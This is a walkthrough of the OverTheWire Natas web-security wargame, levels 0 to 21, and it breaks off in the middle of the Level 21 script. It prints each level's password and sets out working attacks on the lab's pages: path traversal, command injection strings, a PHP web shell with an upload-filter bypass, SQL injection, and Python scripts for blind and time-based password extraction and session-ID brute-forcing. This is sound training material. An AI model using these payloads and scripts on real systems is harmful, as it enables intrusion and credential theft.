# Level 0

The password is in the page source.

```
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

# Level 1

The password is in the page source. Even though right click is disabled, we can use Ctrl+U to view the page source.

```
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

# Level 2

When we view the page source, it shows that there is a `<img src="files/pixel.png">`. Let's view the files in the directory.
The password is in the `users.txt` file.

```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

# Level 3

In the page source, there is a comment `<!-- No more information leaks!! Not even Google will find it this time... -->`.
This probably indicates a `robots.txt` file.
Inside the `robots.txt` file, it disallows the path `/s3cr3t/`. Inside this path, there is another `users.txt` file.

```
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

# Level 4

In this webpage, it shows that access is disallowed because we are visiting from `""` while authorized users should come only from `"http://natas5.natas.labs.overthewire.org/"`.
This might indicate we need some sort of `Referer` in the HTTP Header.
So lets use a header dict of `{"Referer" : "http://natas5.natas.labs.overthewire.org/"}` and send it to the request.

```
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

# Level 5

In this webpage, it shows that access is disallowed because we are not logged in.
This might indicate a lack of cookies/session.
When we view the cookies, we can see that the cookies `loggedin = 0`. This indicates that it is set to `False`.
So lets set it to `True` with `loggedin = 1`.

```
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

# Level 6

In this webpage, we have to input a secret to get the password.
Upon clicking on the view source code, there is a php code within:

```
 <?
 include "includes/secret.inc";
   if(array_key_exists("submit", $_POST)) {
     if($secret == $_POST['secret']) {
     print "Access granted. The password for natas7 is <censored>";
   } else {
     print "Wrong secret";
   }
   }
 ?>
```

It seems like the code is linking to a relative path of `/include/secret.inc`, so let's view that page.

```
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Now, we just have to input the secret given.

```
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

# Level 7

In this webpage, I noticed that there are links that accept php script as an input such as `<a href="index.php?page=about">About</a>`.
This indicates that there might be LFI vulnerability. So let's try using `http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8`.
Voila, we have the password which is `DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe`.

# Level 8

In this webpage, we have to input a secret again to get the password.
Upon clicking on the view source code, there is a php code within:

```
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

It seems like we need to create a php script to reverse the encoded string.

```
<?php
echo base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362")))
?>

OR

echo 3d3d516343746d4d6d6c315669563362 | xxd -r -p | rev | base64 -d
```

Now, we just have to input the decoded secret.

```
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

# Level 9

In this webpage, we have to input a string of words to search for the password.
Upon clicking on the view source code, there is a php code within:

```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

The code takes in a keyword as an input and uses passthru to perform a system command to grep through a file for the specified keyword. Without sanitation, a command execution vulnerability exists in this code.
So let's use `; cat /etc/natas_webpass/natas10 #` to search for the password. Note: `;` denotes a new command and `#` comments out the rest of the command.

```
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

# Level 10

This challenge is similar to Level 9 but with a twist - there is a filter on certain characters.
Upon clicking on the view source code, there is a php code within:

```
Output:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```

The preg_match function is use to filter out the characters `;|&`. So let's use this command instead `.* /etc/natas_webpass/natas11 #`. Note: This command indicates that we want to look for everything in `/etc/natas_webpass/natas11` and then comment out the rest of the command.

```
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

# Level 11

In this webpage, you can set the background color of the webpage. It also mentions that the cookies are protected with XOR encryption.
Upon clicking on the view source code, there is a php code within:

```
<?

$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

function loadData($def) {
    global $_COOKIE;
    $mydata = $def;
    if(array_key_exists("data", $_COOKIE)) {
    $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE["data"])), true);
    if(is_array($tempdata) && array_key_exists("showpassword", $tempdata) && array_key_exists("bgcolor", $tempdata)) {
        if (preg_match('/^#(?:[a-f\d]{6})$/i', $tempdata['bgcolor'])) {
        $mydata['showpassword'] = $tempdata['showpassword'];
        $mydata['bgcolor'] = $tempdata['bgcolor'];
        }
    }
    }
    return $mydata;
}

function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

$data = loadData($defaultdata);

if(array_key_exists("bgcolor",$_REQUEST)) {
    if (preg_match('/^#(?:[a-f\d]{6})$/i', $_REQUEST['bgcolor'])) {
        $data['bgcolor'] = $_REQUEST['bgcolor'];
    }
}

saveData($data);



?>

<h1>natas11</h1>
<div id="content">
<body style="background: <?=$data['bgcolor']?>;">
Cookies are protected with XOR encryption<br/><br/>

<?
if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}

?>
```

Looking at the source code, it looks like we need to reverse engineer the key. So let's do it using a php script:

```
<?php
$cookie = base64_decode(urldecode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%3D"));
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");

function xor_encrypt($in, $key) {
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

// Plaintext ^ Key = Cookie
// Plaintext ^ Cookie = Key
$plaintext = json_encode($defaultdata);
$ciphertext = $cookie;
echo(xor_encrypt($plaintext, $ciphertext)); // retuns qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
?>
```

As the key should be smaller than the plaintext, we can infer that the key is repeated. Therefore, the key should be `qw8J`.
Now, lets get the correct cookie data using the same script:

```
$key = "qw8J";
$actualdata = json_encode(array( "showpassword"=>"yes", "bgcolor"=>"#ffffff"));
$actualcookie = base64_encode(xor_encrypt($actualdata, $key));
echo($actualcookie); // returns ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK
```

Now we can set up the new cookie to get the password.

```
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

# Level 12

In this webpage, it seems like we need to upload some JPEG image.

Upon clicking on the view source code, there is a php code within:

```
<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

It seems that the code will place the uploaded files at `/upload/<random string>.<ext>`. What happens if we upload anything else other than a `jpg` file?

It seems like it worked which indicates that there is not verification of the file extensions. So let's exploit this by uploading a malicious `php` file!

```
<?php
    system($_GET['cmd']); // https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html
?>
```

Once we uploaded the file, we can navigate to `/upload/<generated string>.php?cmd=cat /etc/natas_webpass/natas13` to get the password for natas13!

```
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

# Level 13

This challenge is similar to Level 12 but with a twist - you can only upload image files now.
Upon clicking on the view source code, there is a php code within:

```
<?

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```

It seems that the code uses `exif_imagetype()` to check the first bytes of an image and checks its signature. Checking out this [file signature cheatsheet](https://www.garykessler.net/library/file_sigs.html), we find out that a generic image file has the signature of `FF D8 FF E0` .To bypass this checker, we can use this online [hex editor](https://hexed.it/) to add the image signature to our previously used php code.

Once we uploaded the file, we can navigate to `/upload/<generated string>.php?cmd=cat /etc/natas_webpass/natas14` to get the password for natas13!

```
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

# Level 14

In this webpage, it seems like we need to enter some kind of username and password.

Upon clicking on the view source code, there is a php code within:

```
<?
if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas14', '<censored>');
    mysql_select_db('natas14', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysql_num_rows(mysql_query($query, $link)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysql_close($link);
} else {
?>
```

It seems like there is a SQL query in the code that does not have any code sanitization. There is also an interesting debug code which allows you to view the query executed. Therefore, let's add `?debug` to the back of the url and send a request of `username:natas15` and `password:password`.

```
<div id="content">
Executing query: SELECT * from users where username="natas15" and password="password"<br>Access denied!<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

Now, let's try using `username:natas15"#` instead. What we are trying to do here is to ask SQL to return us the row with `username:natas15` and comment out the rest of the code to make it valid.

```
<div id="content">
Executing query: SELECT * from users where username="natas15"#" and password="password"<br>Successful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J<br><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
```

# Level 15

This challenge is similar to Level 14 but with a twist - you can only check if the username exists.
Upon clicking on the view source code, there is a php code within:

```
/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas15', '<censored>');
    mysql_select_db('natas15', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

It seems that for this level, we will have to do blind SQL attacks. Let's write a python script to do so.

```
import requests
from string import *

username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

characters = ascii_lowercase + ascii_uppercase + digits
# characters = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

password_tried = ""  # empty string

while len(password_tried) != 32:  # we know that every level's password is of length 32
    for ch in characters:
        print("trying this password now --> {}{}".format(password_tried, ch))
        response = session.post(
            url, data={"username": "natas16\" AND BINARY password LIKE \"{}{}%\"#".format(password_tried, ch)}, auth=(username, password))  # BINARY means the character is case sensitive and % indicates a wild card
        content = response.text

        if "user exists" in content:  # if
            password_tried = password_tried + ch  # add character to the string
            break  # break the current loop

print(password_tried) # WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

# Level 16

This challenge is similar to Level 9 and Level 10 but with a twist - it is more secure (by filtering even more characters).
Upon clicking on the view source code, there is a php code within:

```
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```

It seems that the characters filtered are `` ; | & ` ' ``. Interestingly, they filtered the `` `command` `` to prevent command substitution but there is also `$(command)` that does the same thing.

So what will happen if I search for `blanks` in the dictionary then do `$(grep a /etc/natas_webpass/natas17)`?

It returns `blanks`.

What if I did `$(whoami)` instead?

It returns an empty output. Could this be that a correct command will return an empty output? Lets write a python script to test this out.

```
import requests
from string import *

username = "natas16"
password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

session = requests.Session()

characters = ascii_lowercase + ascii_uppercase + digits
# characters = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

url = "http://{}.natas.labs.overthewire.org/".format(username)

password_tried = ""  # empty string
# password_tried = list()


while len(password_tried) != 32:  # we know that every level's password is of length 32
    for ch in characters:
        print("trying this password now --> {}{}".format(password_tried, ch))
        # print("trying this password now --> {}{}".format("".join(password_tried), ch))
        response = session.post(
            url, data={"needle": "blanks$(grep ^{}{} /etc/natas_webpass/natas17)".format(password_tried, ch)}, auth=(username, password))  # ^ means begins with
        # response = session.post(
        #    url, data={"username": "blanks$(grep ^{}{} /etc/natas_webpass/natas17)".format("".join(password_tried), ch)}, auth=(username, password))
        content = response.text

        if "blanks" not in content:  # if the word is not in the output
            password_tried = password_tried + ch  # add character to the string
            # password_tried.append(ch)
            break  # break the current loop

print(password_tried) # 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

# Level 17

This challenge is similar to Level 15 but with a twist - the output is commented out. Therefore, we don't know if the user exists or not.
Upon clicking on the view source code, there is a php code within:

```
<?

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysql_connect('localhost', 'natas17', '<censored>');
    mysql_select_db('natas17', $link);

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysql_query($query, $link);
    if($res) {
    if(mysql_num_rows($res) > 0) {
        //echo "This user exists.<br>";
    } else {
        //echo "This user doesn't exist.<br>";
    }
    } else {
        //echo "Error in query.<br>";
    }

    mysql_close($link);
} else {
?>
```

It seems that for this level, we will have to do timed SQL attacks. Let's write a python script to do so.

```
import requests
from string import *
from time import *

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

characters = ascii_lowercase + ascii_uppercase + digits
# characters = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789

password_tried = ""  # empty string
# password_tried = list()

while len(password_tried) != 32:
    for ch in characters:
        print("trying this password now --> {}{}".format(password_tried, ch))
        start_time = time()  # start timer
        response = session.post(url, data={
            "username": "natas18\" AND BINARY password LIKE \"{}{}%\" AND SLEEP(2)#".format(password_tried, ch)}, auth=(username, password))  # SLEEP forces the SQL result to delay the output
        # response = session.post(
        #    url, data={"username": "natas18\" AND BINARY password LIKE \"{}{}%\" AND SLEEP(2)#".format("".join(password_tried), ch)}, auth=(username, password))
        content = response.text
        end_time = time()  # end timer
        # calculate difference between start time and end time
        difference = end_time - start_time

        if difference > 1:
            password_tried += ch  # add character to string
            # password_tried.append(ch)
            break

print(password_tried) # xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

# Level 18

In this webpage, it seems like we need to enter some kind of username and password.

Upon clicking on the view source code, there is a php code within:

```
<?

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>
```

From the source code, we can tell that the function will return 1 if an admin is logged in. However, the function is disabled - meaning that it will always return 0. It seems that to get the password, we will need to somehow set our session id to be the admin. Note that the `maxid=640`.

Let's check out how does the cookie look like when you try to log in with a random username and password.

```
<RequestsCookieJar[<Cookie PHPSESSID=579 for natas18.natas.labs.overthewire.org/>]> # note that this number could be different for you as it is randomly generated
```

Ok it seems that they are using `PHPSESSID` as the identifier. Let's try to bruteforce this with a python script.

```
import requests

username = "natas18"
password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

# response = session.post(
#     url, data={"username": "admin", "password": "password"}, auth=(username, password))
# print(session.cookies)

max_id = 640
admin_id = 0

for session_id in range(max_id + 1):
    print("Trying session id {} now".format(session_id))
    response = session.get(
        url, cookies={"PHPSESSID": "{}".format(session_id)}, auth=(username, password))
    content = response.text
    if "You are an admin." in content:
        admin_id = session_id
        print(content)
        break

print("Session id for admin found: {}".format(admin_id)) # 119
```

# Level 19

This challenge is similar to Level 18 but with a twist - the session IDs are no longer sequential and there is no source code available.
Let's check out how does the cookie look like for this challenge.

```
<RequestsCookieJar[<Cookie PHPSESSID=3630392d61646d696e for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3633392d61646d696e for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3436322d61646d696e for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3233342d61646d696e for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3136332d61646d696e for natas19.natas.labs.overthewire.org/>]>
```

I tried to log in 5 times using the same username and password. Interestingly, each session returned a different cookie. However, upon closer inspection, it seems like the last few digits `d61646d696e` are always the same.

Then I thought to myself, what happens if I change the username?

```
<RequestsCookieJar[<Cookie PHPSESSID=3237382d75736572 for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3332382d75736572 for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3133342d75736572 for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3133322d75736572 for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3439332d75736572 for natas19.natas.labs.overthewire.org/>]>
```

Surprisingly, the last digits changed! Now, what if I submitted a blank username?

```
<RequestsCookieJar[<Cookie PHPSESSID=3630322d for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3538322d for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3336352d for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3432322d for natas19.natas.labs.overthewire.org/>]>
<RequestsCookieJar[<Cookie PHPSESSID=3531322d for natas19.natas.labs.overthewire.org/>]>
```

The cookies became shorter! Then, I took some of the cookies to [cyberchef](https://gchq.github.io/CyberChef/) to decode the encoded string. It turns out that the cookies were encoded in Hex in the following format `<random number> - <username>`!

```
609-admin
639-admin
462-admin
234-admin
163-admin
```

Now that we know its encoding method, let's try to bruteforce the admin's session id using a python script.

```
import requests

username = "natas19"
password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)

# response = session.post(
#     url, data={"username": "admin", "password": "password"}, auth=(username, password))
# print(bytes.fromhex(session.cookies["PHPSESSID"]).decode('utf-8'))

# print("test".encode("utf-8").hex())

max_id = 640
admin_id = 0

for session_id in range(max_id + 1):
    print("Trying session id {} now".format(session_id))
    encoded_session_id = "{}-admin".format(session_id).encode("utf-8").hex()
    response = session.get(
        url, cookies={"PHPSESSID": "{}".format(encoded_session_id)}, auth=(username, password))
    content = response.text
    if "You are an admin." in content:
        admin_id = session_id
        print(content)
        break

print("Session id for admin found: {}".format(admin_id)) # 281
```

# Level 20

In this webpage, it seems like we are already logged in as a regular user. We have to somehow retrieve the credentials for natas21.

Upon clicking on the view source code, there is a php code within:

```
<?

function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas21\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
    }
}
/* }}} */

/* we don't need this */
function myopen($path, $name) {
    //debug("MYOPEN $path $name");
    return true;
}

/* we don't need this */
function myclose() {
    //debug("MYCLOSE");
    return true;
}

function myread($sid) {
    debug("MYREAD $sid");
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return "";
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    if(!file_exists($filename)) {
        debug("Session file doesn't exist");
        return "";
    }
    debug("Reading from ". $filename);
    $data = file_get_contents($filename);
    $_SESSION = array();
    foreach(explode("\n", $data) as $line) {
        debug("Read [$line]");
    $parts = explode(" ", $line, 2);
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
    }
    return session_encode();
}

function mywrite($sid, $data) {
    // $data contains the serialized version of $_SESSION
    // but our encoding is better
    debug("MYWRITE $sid $data");
    // make sure the sid is alnum only!!
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
    debug("Invalid SID");
        return;
    }
    $filename = session_save_path() . "/" . "mysess_" . $sid;
    $data = "";
    debug("Saving in ". $filename);
    ksort($_SESSION);
    foreach($_SESSION as $key => $value) {
        debug("$key => $value");
        $data .= "$key $value\n";
    }
    file_put_contents($filename, $data);
    chmod($filename, 0600);
}

/* we don't need this */
function mydestroy($sid) {
    //debug("MYDESTROY $sid");
    return true;
}
/* we don't need this */
function mygarbage($t) {
    //debug("MYGARBAGE $t");
    return true;
}

session_set_save_handler(
    "myopen",
    "myclose",
    "myread",
    "mywrite",
    "mydestroy",
    "mygarbage");
session_start();

if(array_key_exists("name", $_REQUEST)) {
    $_SESSION["name"] = $_REQUEST["name"];
    debug("Name set to " . $_REQUEST["name"]);
}

print_credentials();

$name = "";
if(array_key_exists("name", $_SESSION)) {
    $name = $_SESSION["name"];
}

?>
```

After reading the source code, it seems like there are 3 functions of interest - `print_credentials`, `myread `and `mywrite `. In `print_credentials`, it shows that to retrieve the password, the key has to be `admin` and the value has to be `1`.

As I couldn't understand the code well, I decided to use the debug function - by adding a `?debug=true` at the end of the url - to help me understand what the code was trying to do.

I tried changing the name to `admin` and this was the output. It seems that the key-value pair that was written to the server is `name:admin`.

```
DEBUG: MYREAD 4sstbfskg8g9f8juahuug37q16
DEBUG: Session file doesn't exist

DEBUG: MYWRITE 4sstbfskg8g9f8juahuug37q16 name|s:5:"admin";
DEBUG: Saving in /var/lib/php5/sessions//mysess_4sstbfskg8g9f8juahuug37q16
DEBUG: name => admin
```

Then I refreshed the page again. As expected, the key-value pair that was read from the server is `name:admin`.

```
DEBUG: MYREAD birvjcqbip0p0qvnkottdd2p43
DEBUG: Reading from /var/lib/php5/sessions//mysess_birvjcqbip0p0qvnkottdd2p43
DEBUG: Read [name admin]
DEBUG: Read []

DEBUG: MYWRITE birvjcqbip0p0qvnkottdd2p43 name|s:5:"admin";
DEBUG: Saving in /var/lib/php5/sessions//mysess_birvjcqbip0p0qvnkottdd2p43
DEBUG: name => admin
```

By reading the debug output and trying to link it to the source code, I figured out that the `mywrite` function writes the key-value pair of the session id in to the file system which will be read later by `myread` in an array delimited by `\n`.

In this challenge, we need to make the key-value pair `admin:1` but it seems impossible because the key would always be `name:something`. Then I wondered, is there a way to make the server store the data like this by using a newline character?

```
name:admin
admin:1
```

Here's the python script to do so.

```
import requests

username = "natas20"
password = "eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/?debug=true".format(username)

response = session.post(
    url, data={"name": "admin\nadmin 1"}, auth=(username, password))
content = response.text
print(content)

print("\n\n")

response = session.get(url, auth=(username, password))
content = response.text
print(content)
```

# Level 21

In this webpage, it seems like we are already logged in as a regular user. We have to somehow retrieve the credentials for natas22. The website is also colocated with http://natas21-experimenter.natas.labs.overthewire.org.

Upon clicking on the view source code, there is a php code within:

```
<?

function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas22\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.";
    }
}
/* }}} */

session_start();
print_credentials();

?>
```

It seems like there is nothing much here. So let's visit the experimenter website instead.

The experimenter website seems to have its own source code as well.

```
<?

session_start();

// if update was submitted, store it
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
    $_SESSION[$key] = $val;
    }
}

if(array_key_exists("debug", $_GET)) {
    print "[DEBUG] Session contents:<br>";
    print_r($_SESSION);
}

// only allow these keys
$validkeys = array("align" => "center", "fontsize" => "100%", "bgcolor" => "yellow");
$form = "";

$form .= '<form action="index.php" method="POST">';
foreach($validkeys as $key => $defval) {
    $val = $defval;
    if(array_key_exists($key, $_SESSION)) {
    $val = $_SESSION[$key];
    } else {
    $_SESSION[$key] = $val;
    }
    $form .= "$key: <input name='$key' value='$val' /><br>";
}
$form .= '<input type="submit" name="submit" value="Update" />';
$form .= '</form>';

$style = "background-color: ".$_SESSION["bgcolor"]."; text-align: ".$_SESSION["align"]."; font-size: ".$_SESSION["fontsize"].";";
$example = "<div style='$style'>Hello world!</div>";

?>
```

It looks like we can just pass `admin:1` into the experimenter page to obtain the session id which we can use in our main page to obtain the password.

```
import requests

username = "natas21"
password = "IFekPyrQXftziDEsUr3x21sYuahypdgJ"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/?debug=true".format(username)
experimenter_url = "http://natas21-experimenter.natas.labs.overthewire.org/?debug=true"

# response = session.get(url, auth=(username, password))
# content = response.text
# print(content)

# response = session.get(experimenter_url, auth=(username, password))
